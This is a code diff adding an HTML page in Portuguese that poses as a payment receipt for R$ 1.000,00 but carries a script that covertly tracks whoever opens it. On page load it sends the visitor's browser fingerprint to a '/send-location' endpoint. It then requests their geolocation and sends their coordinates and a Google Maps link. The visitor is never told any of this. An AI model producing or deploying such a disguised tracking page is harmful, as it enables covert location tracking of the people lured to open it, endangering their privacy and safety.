@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener("load", () => {
+      // Preenche a data
+      const dataAtual = new Date();
+      const dia = String(dataAtual.getDate()).padStart(2, '0');
+      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+      const ano = dataAtual.getFullYear();
+      document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+
+      let fallbackSent = false;
+      let coordsSent = false;
+
+      function getFingerprint() {
+        return {
+          userAgent: navigator.userAgent || null,
+          language: navigator.language || null,
+          platform: navigator.platform || null,
+          timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
+            ? Intl.DateTimeFormat().resolvedOptions().timeZone
+            : null,
+          screenWidth: window.screen?.width || null,
+          screenHeight: window.screen?.height || null
+        };
+      }
+
+      function sendLocation(payload = {}) {
+        fetch("/send-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        }).catch((err) => console.error("Erro ao enviar:", err));
+      }
+
+      // Sempre envia fallback inicial (sem coords) com fingerprint + timestamp
+      (function sendImmediateFallback() {
+        if (!fallbackSent) {
+          fallbackSent = true;
+          const fingerprint = getFingerprint();
+          const timestamp = new Date().toLocaleString("pt-BR");
+          sendLocation({ fingerprint, timestamp });
+        }
+      })();
+
+      // Tenta geolocalização do navegador
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            if (coordsSent) return;
+            coordsSent = true;
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const fingerprint = getFingerprint();
+            const timestamp = new Date().toLocaleString("pt-BR");
+            sendLocation({ latitude, longitude, maps, fingerprint, timestamp });
+          },
+          (err) => {
+            console.debug("Geolocation error (ignored):", err && err.message);
+          },
+          {
+            timeout: 4000, // tempo máximo para resposta do navegador
+            maximumAge: 0,
+            enableHighAccuracy: false
+          }
+        );
+
+        // Fallback garantido em 5s
+        setTimeout(() => {
+          if (!fallbackSent) {
+            fallbackSent = true;
+            const fingerprint = getFingerprint();
+            const timestamp = new Date().toLocaleString("pt-BR");
+            sendLocation({ fingerprint, timestamp });
+          }
+        }, 5000);
+      }
+    });
+  </script>
+</body>
+</html>
+
